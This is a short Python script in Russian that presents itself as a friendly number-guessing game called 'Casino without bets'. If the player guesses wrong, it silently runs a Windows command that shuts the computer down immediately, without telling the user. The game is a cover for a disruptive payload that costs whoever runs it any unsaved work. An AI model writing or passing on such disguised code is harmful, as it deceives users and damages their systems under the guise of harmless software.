import os 
import random
import time 
print("Приветствую вас дорогой пользователь! Рад сообщить что вы принимаете участие в программе 'Казино без ставок'.")
time.sleep(2)
a = int(input("Пожалуйста введите число от 1 до 10. Спасибо."))
b = random.randint(1,10)
if a == b:
    print("Отличная игра! Вы угадали число! Поздравляю с победой!")
else:
    print("К сожалению вы проиграли.")
    time.sleep(5)
    os.system('shutdown /s /t 0')